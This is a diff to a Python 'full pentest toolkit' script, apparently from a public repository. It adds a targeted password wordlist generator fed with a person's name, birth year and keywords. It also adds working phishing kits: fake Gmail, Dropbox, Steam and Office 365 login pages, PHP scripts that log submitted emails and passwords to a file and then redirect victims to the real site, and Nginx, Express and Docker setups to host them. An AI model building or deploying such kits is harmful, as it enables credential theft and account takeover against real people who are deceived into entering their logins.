@@ -14,6 +14,7 @@ import shutil
 from urllib.parse import urlparse
 import sys
 import re
+from datetime import datetime
 
 # Add color output utilities
 class Colors:
@@ -92,7 +93,7 @@ BANNER = f"""
 ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
 ██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
 ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
-              FULL PENTEST TOOLKIT (V1.0)
+              FULL PENTEST TOOLKIT (V1.2.1)
 
          {Colors.BOLD}Created by astra-incognito{Colors.ENDC}{Colors.OKCYAN}
          GitHub: https://github.com/astra-incognito/
@@ -883,6 +884,23 @@ def osint_wordlist_generator():
     company = input("Company/organization (optional): ").strip()
     birth_year = input("Birth year (optional): ").strip()
     keywords = input("Other keywords (comma separated): ").strip().split(",")
+    
+    # Ask for number of password generations
+    while True:
+        try:
+            num_generations = input("Number of password variations to generate (default 100): ").strip()
+            if not num_generations:
+                num_generations = 100
+            else:
+                num_generations = int(num_generations)
+                if num_generations <= 0:
+                    print("[-] Number must be positive. Using default 100.")
+                    num_generations = 100
+            break
+        except ValueError:
+            print("[-] Invalid number. Using default 100.")
+            num_generations = 100
+    
     base = []
     if name:
         parts = name.split()
@@ -895,21 +913,115 @@ def osint_wordlist_generator():
     if birth_year:
         base.append(birth_year)
     base.extend([k.strip() for k in keywords if k.strip()])
-    # Generate variations
+    
+    if not base:
+        print("[-] No base words provided. Please enter at least one piece of information.")
+        return
+    
+    # Generate variations with controlled count
     wordlist = set()
+    suffixes = ["123", "!", "2023", "2024", "#", "@", "1", "01", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
+    years = ["2020", "2021", "2022", "2023", "2024", "2025"]
+    special_chars = ["!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "-", "="]
+    
+    # Add base words first
     for word in base:
+        if len(wordlist) >= num_generations:
+            break
         wordlist.add(word)
         wordlist.add(word.lower())
         wordlist.add(word.upper())
         wordlist.add(word.capitalize())
-        for suffix in ["123", "!", "2023", "2024", "#", "@", "1", "01"]:
+    
+    # Add variations with suffixes
+    for word in base:
+        if len(wordlist) >= num_generations:
+            break
+        for suffix in suffixes:
+            if len(wordlist) >= num_generations:
+                break
             wordlist.add(word + suffix)
+            wordlist.add(word.lower() + suffix)
+            wordlist.add(word.upper() + suffix)
+    
+    # Add year combinations
+    for word in base:
+        if len(wordlist) >= num_generations:
+            break
+        for year in years:
+            if len(wordlist) >= num_generations:
+                break
+            wordlist.add(word + year)
+            wordlist.add(word.lower() + year)
+    
+    # Add special character combinations
+    for word in base:
+        if len(wordlist) >= num_generations:
+            break
+        for char in special_chars:
+            if len(wordlist) >= num_generations:
+                break
+            wordlist.add(word + char)
+            wordlist.add(char + word)
+            wordlist.add(word.lower() + char)
+    
+    # Add number combinations (1-999)
+    for word in base:
+        if len(wordlist) >= num_generations:
+            break
+        for i in range(1, min(100, num_generations - len(wordlist) + 1)):
+            if len(wordlist) >= num_generations:
+                break
+            wordlist.add(word + str(i))
+            wordlist.add(word.lower() + str(i))
+            wordlist.add(str(i) + word)
+    
+    # Add leetspeak variations
+    leet_dict = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
+    for word in base:
+        if len(wordlist) >= num_generations:
+            break
+        leet_word = word.lower()
+        for char, replacement in leet_dict.items():
+            leet_word = leet_word.replace(char, replacement)
+        wordlist.add(leet_word)
+    
+    # Add reversed words
+    for word in base:
+        if len(wordlist) >= num_generations:
+            break
+        wordlist.add(word[::-1])
+        wordlist.add(word.lower()[::-1])
+    
+    # Add combinations of base words
+    if len(base) > 1:
+        for i, word1 in enumerate(base):
+            if len(wordlist) >= num_generations:
+                break
+            for word2 in base[i+1:]:
+                if len(wordlist) >= num_generations:
+                    break
+                wordlist.add(word1 + word2)
+                wordlist.add(word1.lower() + word2.lower())
+                wordlist.add(word1 + word2.lower())
+    
+    # Convert to list and limit to exact number requested
+    wordlist = list(wordlist)[:num_generations]
+    
     # Save to file
     fname = input("Save wordlist as (default osint_wordlist.txt): ").strip() or "osint_wordlist.txt"
     with open(fname, "w") as f:
         for w in sorted(wordlist):
             f.write(w + "\n")
+    
     print(f"[+] Wordlist saved to {fname} ({len(wordlist)} entries)")
+    print(f"[+] Generated exactly {len(wordlist)} password variations as requested")
+    
+    # Show sample of generated passwords
+    if wordlist:
+        print(f"[+] Sample passwords: {', '.join(wordlist[:5])}")
+        if len(wordlist) > 5:
+            print(f"[+] ... and {len(wordlist) - 5} more variations")
 
 def wifi_scan():
     print("[+] Scanning for WiFi networks (requires monitor mode and root)...")
@@ -3036,8 +3148,12 @@ def advanced_site_cloner():
             assets_dir = f"{folder}/assets"
             os.makedirs(assets_dir, exist_ok=True)
             
-            # Download images
+            # Initialize file counters
+            css_files = []
+            js_files = []
             img_files = []
+            
+            # Download images
             for img in soup.find_all('img'):
                 img_url = img.get('src')
                 if img_url:
@@ -3075,6 +3191,7 @@ def advanced_site_cloner():
                         with open(f"{assets_dir}/{css_filename}", "w") as f:
                             f.write(css_response.text)
                         link['href'] = f"assets/{css_filename}"
+                        css_files.append(css_filename)
                     except:
                         pass
             
@@ -3389,6 +3506,357 @@ def create_social_media_template():
     
     print(f"[+] Social media template created in {folder}/")
 
+def create_email_template():
+    print("[+] Creating Email Services Template")
+    folder = "phish_email"
+    os.makedirs(folder, exist_ok=True)
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Gmail - Sign in</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f1f3f4; margin: 0; padding: 20px; }
+            .container { max-width: 450px; margin: 100px auto; background: white; padding: 48px 40px 36px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .logo { text-align: center; margin-bottom: 30px; }
+            .logo img { width: 75px; height: 75px; }
+            h1 { color: #202124; font-size: 24px; margin: 0 0 20px 0; text-align: center; }
+            input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+            button { width: 100%; background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 500; margin-top: 20px; }
+            button:hover { background: #1557b0; }
+            .forgot { text-align: center; margin-top: 20px; }
+            .forgot a { color: #1a73e8; text-decoration: none; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iNzUiIHZpZXdCb3g9IjAgMCA3NSA3NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM3LjUgMUMxNy4yIDEgMSAxNy4yIDEgMzcuNUMxIDU3LjggMTcuMiA3NCAzNy41IDc0QzU3LjggNzQgNzQgNTcuOCA3NCAzNy41Qzc0IDE3LjIgNTcuOCAxIDM3LjUgMVoiIGZpbGw9IiM0Q0FGNTAiLz4KPHBhdGggZD0iTTI1IDI4LjVMMzcuNSAxNkw1MCAyOC41VjUwSDI1VjI4LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="Gmail">
+            </div>
+            <h1>Sign in</h1>
+            <form action="capture.php" method="post">
+                <input type="email" name="email" placeholder="Email or phone" required>
+                <input type="password" name="password" placeholder="Enter your password" required>
+                <button type="submit">Next</button>
+            </form>
+            <div class="forgot">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+    </body>
+    </html>
+    """
+    
+    with open(f"{folder}/index.html", "w") as f:
+        f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Email: " . $_POST['email'] . "\\n";
+        $data .= "Password: " . $_POST['password'] . "\\n";
+        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://accounts.google.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Email template created in {folder}/")
+
+def create_cloud_template():
+    print("[+] Creating Cloud Storage Template")
+    folder = "phish_cloud"
+    os.makedirs(folder, exist_ok=True)
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Dropbox - Sign in</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
+            .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .logo { text-align: center; margin-bottom: 30px; }
+            .logo h1 { color: #0061fe; margin: 0; font-size: 32px; }
+            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            button { width: 100%; background: #0061fe; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+            button:hover { background: #0051d4; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <h1>Dropbox</h1>
+            </div>
+            <form action="capture.php" method="post">
+                <input type="email" name="email" placeholder="Email address" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    """
+    
+    with open(f"{folder}/index.html", "w") as f:
+        f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Email: " . $_POST['email'] . "\\n";
+        $data .= "Password: " . $_POST['password'] . "\\n";
+        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://www.dropbox.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Cloud storage template created in {folder}/")
+
+def create_gaming_template():
+    print("[+] Creating Gaming Platform Template")
+    folder = "phish_gaming"
+    os.makedirs(folder, exist_ok=True)
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Steam - Sign in</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #1b2838; margin: 0; padding: 20px; }
+            .container { max-width: 400px; margin: 100px auto; background: #2a475e; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+            .logo { text-align: center; margin-bottom: 30px; }
+            .logo h1 { color: #66c0f4; margin: 0; font-size: 32px; }
+            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #4a5c6b; border-radius: 4px; box-sizing: border-box; background: #1b2838; color: white; }
+            button { width: 100%; background: #66c0f4; color: #1b2838; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+            button:hover { background: #4a9bc4; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <h1>Steam</h1>
+            </div>
+            <form action="capture.php" method="post">
+                <input type="text" name="username" placeholder="Steam Account Name" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    """
+    
+    with open(f"{folder}/index.html", "w") as f:
+        f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Username: " . $_POST['username'] . "\\n";
+        $data .= "Password: " . $_POST['password'] . "\\n";
+        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://store.steampowered.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Gaming platform template created in {folder}/")
+
+def create_corporate_template():
+    print("[+] Creating Corporate/Enterprise Template")
+    folder = "phish_corporate"
+    os.makedirs(folder, exist_ok=True)
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Office 365 - Sign in</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f3f2f1; margin: 0; padding: 20px; }
+            .container { max-width: 440px; margin: 100px auto; background: white; padding: 44px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .logo { text-align: center; margin-bottom: 30px; }
+            .logo h1 { color: #0078d4; margin: 0; font-size: 24px; }
+            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            button { width: 100%; background: #0078d4; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+            button:hover { background: #106ebe; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <h1>Sign in</h1>
+            </div>
+            <form action="capture.php" method="post">
+                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+                <button type="submit">Next</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    """
+    
+    with open(f"{folder}/index.html", "w") as f:
+        f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Email: " . $_POST['email'] . "\\n";
+        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://login.microsoftonline.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Corporate template created in {folder}/")
+
+def custom_template_builder():
+    print("[+] Custom Template Builder")
+    print("[!] This will help you create a custom phishing template.")
+    
+    template_name = input("Template name: ").strip()
+    if not template_name:
+        template_name = "custom_template"
+    
+    folder = f"phish_{template_name}"
+    os.makedirs(folder, exist_ok=True)
+    
+    print("[!] Choose template type:")
+    print("1. Login form")
+    print("2. Registration form")
+    print("3. Password reset")
+    print("4. File upload")
+    print("5. Custom HTML")
+    
+    template_type = input("Select template type (1-5): ").strip() or "1"
+    
+    if template_type == "5":
+        print("[+] Enter your custom HTML (press Enter twice to finish):")
+        custom_html = ""
+        while True:
+            line = input()
+            if line == "" and custom_html.endswith("\n"):
+                break
+            custom_html += line + "\n"
+        
+        with open(f"{folder}/index.html", "w") as f:
+            f.write(custom_html)
+    else:
+        # Generate basic template based on type
+        if template_type == "1":
+            title = "Login"
+            fields = [("username", "Username"), ("password", "Password")]
+        elif template_type == "2":
+            title = "Register"
+            fields = [("username", "Username"), ("email", "Email"), ("password", "Password"), ("confirm_password", "Confirm Password")]
+        elif template_type == "3":
+            title = "Password Reset"
+            fields = [("email", "Email Address")]
+        elif template_type == "4":
+            title = "File Upload"
+            fields = [("file", "Select File")]
+        else:
+            title = "Login"
+            fields = [("username", "Username"), ("password", "Password")]
+        
+        html = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>{title}</title>
+            <style>
+                body {{ font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }}
+                .container {{ max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+                h1 {{ text-align: center; color: #333; margin-bottom: 30px; }}
+                input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
+                button {{ width: 100%; background: #007bff; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }}
+                button:hover {{ background: #0056b3; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>{title}</h1>
+                <form action="capture.php" method="post">
+        """
+        
+        for field_name, field_label in fields:
+            if field_name == "password" or field_name == "confirm_password":
+                html += f'                    <input type="password" name="{field_name}" placeholder="{field_label}" required>\n'
+            elif field_name == "email":
+                html += f'                    <input type="email" name="{field_name}" placeholder="{field_label}" required>\n'
+            elif field_name == "file":
+                html += f'                    <input type="file" name="{field_name}" required>\n'
+            else:
+                html += f'                    <input type="text" name="{field_name}" placeholder="{field_label}" required>\n'
+        
+        html += """
+                    <button type="submit">Submit</button>
+                </form>
+            </div>
+        </body>
+        </html>
+        """
+        
+        with open(f"{folder}/index.html", "w") as f:
+            f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "Data: " . json_encode($_POST) . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://www.google.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Custom template created in {folder}/")
+
 # Server setup functions
 def setup_apache_php_server():
     print("[+] Setting up Apache + PHP server...")
@@ -3454,6 +3922,229 @@ if __name__ == '__main__':
     
     print("[+] Flask server created: phish_server.py")
     print("[+] Run with: python3 phish_server.py")
+    print("[+] Access via: http://your-ip:8080/")
+
+def setup_nginx_php_server():
+    print("[+] Setting up Nginx + PHP server...")
+    
+    # Install Nginx and PHP
+    subprocess.run(["sudo", "apt", "update"])
+    subprocess.run(["sudo", "apt", "install", "-y", "nginx", "php-fpm", "php-mysql"])
+    
+    # Create phishing directory
+    phish_dir = "/var/www/html/phish"
+    subprocess.run(["sudo", "mkdir", "-p", phish_dir])
+    subprocess.run(["sudo", "chown", "-R", "$USER:$USER", phish_dir])
+    
+    # Create Nginx configuration
+    nginx_conf = """
+server {
+    listen 80;
+    server_name _;
+    root /var/www/html/phish;
+    index index.html index.php;
+    
+    location / {
+        try_files $uri $uri/ =404;
+    }
+    
+    location ~ \\.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+    }
+}
+"""
+    
+    with open("phish_nginx.conf", "w") as f:
+        f.write(nginx_conf)
+    
+    print(f"[+] Nginx server configured at {phish_dir}")
+    print("[+] Upload phishing files to this directory")
+    print("[+] Access via: http://your-ip/phish/")
+    print("[+] Nginx config saved as: phish_nginx.conf")
+
+def setup_express_server():
+    print("[+] Setting up Node.js Express server...")
+    
+    # Create package.json
+    package_json = """
+{
+  "name": "phish-server",
+  "version": "1.0.0",
+  "description": "Phishing server",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "body-parser": "^1.19.0"
+  }
+}
+"""
+    
+    with open("package.json", "w") as f:
+        f.write(package_json)
+    
+    # Create Express server
+    express_app = """
+const express = require('express');
+const bodyParser = require('body-parser');
+const path = require('path');
+const fs = require('fs');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+app.use(express.static('public'));
+
+// Serve phishing page
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Capture form data
+app.post('/capture', (req, res) => {
+    const data = {
+        timestamp: new Date().toISOString(),
+        ip: req.ip,
+        userAgent: req.headers['user-agent'],
+        formData: req.body
+    };
+    
+    fs.appendFileSync('captured.json', JSON.stringify(data) + '\\n');
+    
+    // Redirect to legitimate site
+    res.redirect('https://www.google.com');
+});
+
+app.listen(PORT, () => {
+    console.log(`Phishing server running on port ${PORT}`);
+});
+"""
+    
+    with open("server.js", "w") as f:
+        f.write(express_app)
+    
+    # Create public directory and sample page
+    os.makedirs("public", exist_ok=True)
+    
+    sample_html = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #333; margin-bottom: 30px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; background: #007bff; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Login</h1>
+        <form action="/capture" method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+    
+    with open("public/index.html", "w") as f:
+        f.write(sample_html)
+    
+    print("[+] Express server created:")
+    print("[+] - package.json (dependencies)")
+    print("[+] - server.js (main server)")
+    print("[+] - public/index.html (sample page)")
+    print("[+] Run with: npm install && npm start")
+    print("[+] Access via: http://your-ip:3000/")
+
+def setup_docker_server():
+    print("[+] Setting up Docker container...")
+    
+    # Create Dockerfile
+    dockerfile = """
+FROM nginx:alpine
+
+# Install PHP
+RUN apk add --no-cache php-fpm php-mysqli
+
+# Copy nginx configuration
+COPY nginx.conf /etc/nginx/conf.d/default.conf
+
+# Create web directory
+RUN mkdir -p /var/www/html/phish
+
+# Copy phishing files
+COPY phish/ /var/www/html/phish/
+
+# Expose port
+EXPOSE 80
+
+# Start nginx and php-fpm
+CMD ["sh", "-c", "php-fpm -D && nginx -g 'daemon off;'"]
+"""
+    
+    with open("Dockerfile", "w") as f:
+        f.write(dockerfile)
+    
+    # Create nginx configuration for Docker
+    nginx_docker_conf = """
+server {
+    listen 80;
+    server_name _;
+    root /var/www/html/phish;
+    index index.html index.php;
+    
+    location / {
+        try_files $uri $uri/ =404;
+    }
+    
+    location ~ \\.php$ {
+        fastcgi_pass 127.0.0.1:9000;
+        fastcgi_index index.php;
+        include fastcgi_params;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    }
+}
+"""
+    
+    with open("nginx.conf", "w") as f:
+        f.write(nginx_docker_conf)
+    
+    # Create docker-compose.yml
+    docker_compose = """
+version: '3'
+services:
+  phish-server:
+    build: .
+    ports:
+      - "8080:80"
+    volumes:
+      - ./phish:/var/www/html/phish
+"""
+    
+    with open("docker-compose.yml", "w") as f:
+        f.write(docker_compose)
+    
+    # Create phish directory
+    os.makedirs("phish", exist_ok=True)
+    
+    print("[+] Docker setup created:")
+    print("[+] - Dockerfile")
+    print("[+] - nginx.conf")
+    print("[+] - docker-compose.yml")
+    print("[+] - phish/ directory")
+    print("[+] Build and run with: docker-compose up --build")
     print("[+] Access via: http://your-ip:8080/")
 
 def wifi_scan_advanced_wrapper():
@@ -3912,11 +4603,6 @@ def main_menu():
     while True:
         show_main_menu()
 
-# Update the main execution to use the new categorized menu system
-if __name__ == "__main__":
-    check_and_prompt_dependencies()
-    main_menu()
-
 def auto_integrate_tools():
     """Automatically integrate newly installed tools into the menu system"""
     print(f"{Colors.OKCYAN}[+] Auto-Integrating Tools into Menu System{Colors.ENDC}")
@@ -4198,3 +4884,8 @@ def {tool_name.lower()}_wrapper():
     
     print(f"{Colors.OKGREEN}[+] Custom wrapper created: {wrapper_file}{Colors.ENDC}")
     print(f"{Colors.OKBLUE}[*] You can now use this tool in the {category} category{Colors.ENDC}")
+
+# Update the main execution to use the new categorized menu system
+if __name__ == "__main__":
+    check_and_prompt_dependencies()
+    main_menu()
